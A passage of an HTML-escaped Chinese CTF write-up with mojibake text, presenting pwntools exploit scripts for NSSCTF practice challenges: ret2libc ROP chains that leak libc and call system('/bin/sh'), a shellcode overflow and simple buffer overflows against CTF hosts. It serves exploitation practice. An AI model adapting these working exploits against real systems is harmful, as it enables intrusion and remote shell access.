class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program = &amp;quot;./Desktop/é™„ä»¶&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28406)#process(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = 0x400763&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ret = 0x400509&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__start = 0x400570&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*(0x10+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))  #\\æ¥æ”¶putsçš„gotåœ°å€å› ä¸ºæ ˆåœ°å€ä¸€èˆ¬æ˜¯ç”±\x7få¼€å¤´çš„è‡ªåŠ¨è¡¥å…¨8ä½&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr) #\\åˆ©ç”¨puts_addråœ¨LibcSearcheré‡Œé¢æŸ¥æ‰¾å¯¹æ˜ çš„åº“&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)  #\\åˆ©ç”¨puts_addrï¼ˆåŠ¨æ€åœ°å€ï¼‰å‡å»putsçš„å‡½æ•°åç§»é‡å³å¯å¾—åˆ°libcçš„åŸºåœ°å€&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh_str=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;) #\\ä¸‹é¢çš„å¾—åˆ°åŸºåœ°å€åéƒ½åŠ ä¸Šåç§»é‡å°±èƒ½å¾—åˆ°å¯¹åº”çš„å‡½æ•°äº†&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;libc addr is %x&amp;#x27;%libc_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;bin_sh_str is %x&amp;#x27;%bin_sh_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\ä½¿ç”¨ä¸€ä¸ªretæ¥è·³è½¬åˆ°pop_rdiç„¶åå°±åˆ©ç”¨system(/bin/sh)å³å¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸ªå¤§ä½¬ç”¨çš„è£¸ so æ‰“è¿›å»çš„&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;, arch=&amp;#x27;amd64&amp;#x27;, log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28820)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def debug():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def get_addr():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400763&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x18 + p64(rdi) + p64(elf.got[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;vuln&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = get_addr() - 0x06f6a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + 0x0453a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + 0x18ce57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x18 + p64(rdi) + p64(binsh) + p64(system) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019ä¸œåŒ—pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019ä¸œåŒ—pwn2&#34;&gt;#&lt;/a&gt; [CISCN 2019 ä¸œåŒ—] PWN2&lt;/h5&gt;
&lt;p&gt;è¿™åˆæ˜¯ä¸ª ret2libc çš„ä½“å‹ç›´æ¥æ‰“&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;quot;./pwn2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28652)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start=0x400790&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4006b9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_ret=0x400c83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x58+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;choice!&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;encrypted&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr=u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr=puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;*0x58+p64(ret)+p64(rdi_ret)+p64(str_bin_sh)+p64(system_addr)+p64(start)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;choice!&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;encrypted&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;wustctf-2020getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wustctf-2020getshell&#34;&gt;#&lt;/a&gt; [WUSTCTF 2020]getshell&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªæ‹¿åˆ° flag åäº¤ä¸äº†&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28667)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=0x804851B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x18+0x4)+p32(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023easy-pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023easy-pwn&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023]EASY PWN&lt;/h5&gt;
&lt;p&gt;æœ¬åœ°è¿è¡Œå‘ç°å¤šè¾“å…¥å‡ ä½å‘ç°æç¤ºæ²¡æœ‰ flag.txt å¯ä»¥çŒœåˆ°ç›´æ¥ nc è¿æ¥å¤šè¾“å…¥å‡ ä½å³å¯å¾—åˆ° flagï¼Œè™½ç„¶å¾—åˆ°äº† flag ä½†æ˜¯è¿˜æ˜¯è¦åˆ†æä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼Œä½¿ç”¨ checksec åå¯ä»¥æŸ¥çœ‹è¿™ä¸ªå¼€å¯äº†åœ°å€éšæœºåŒ–é‚£æ‰“å¼€ ida å‘ç°è¿™ä¸ª main è°ƒç”¨ check ç„¶ååœ¨è°ƒç”¨ printflagï¼Œç„¶åæˆ‘ä»¬è¿˜æ˜¯å†™ä¸ªè„šæœ¬&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;pwn&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28563)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ret2shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ret2shellcode&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ret2shellcode&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜è¦æ³¨æ„ c è¯­è¨€çš„å‡ ä¸ªå‡½æ•° memsetã€strcpyã€mprotect å…¶ä¸­ mprotect æ˜¯èµ‹æƒé™ strcpy æ˜¯å¤åˆ¶ç„¶å memset æ˜¯è®¾ç½®å‰é¢çš„å­—ç¬¦æ›¿æ¢ä¸ºæŒ‡å®šå­—ç¬¦&lt;br /&gt;
æŒ‰ç…§é¢˜ç›®æ ‡é¢˜çš„è¯æˆ‘ä»¬ç›´æ¥å†™å…¥ shellcode é€ æˆæº¢å‡ºç„¶ååœ¨è°ƒç”¨ buff å‡½æ•°å³å¯ï¼Œå› ä¸º shellcode å†™å…¥çš„è¯ strcpy å°†æˆ‘ä»¬å†™å…¥çš„ shellcode å†™å…¥åˆ°äº† buff å­—æ®µ&lt;br /&gt;
 buff å­—æ®µå¯ä»¥ç›´æ¥å».bss æŸ¥çœ‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,arch=&amp;#x27;amd64&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28457)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=asm(shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=shellcode.ljust(0x108,b&amp;#x27;a&amp;#x27;)+p64(0x4040A0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;2021-é¹¤åŸæ¯littleof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2021-é¹¤åŸæ¯littleof&#34;&gt;#&lt;/a&gt; [2021 é¹¤åŸæ¯] littleof&lt;/h5&gt;
&lt;p&gt;æ³¨æ„ canary ä¿æŠ¤ç»•è¿‡æ–¹æ³•æ³¨æ„ä½¿ç”¨æ–¹æ³• nssctf ä¸Šçš„ç¯å¢ƒæœ‰é—®é¢˜æˆ‘çš„ poc æ‰“ä¸è¿›å»åªæœ‰ç”¨è¿™ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 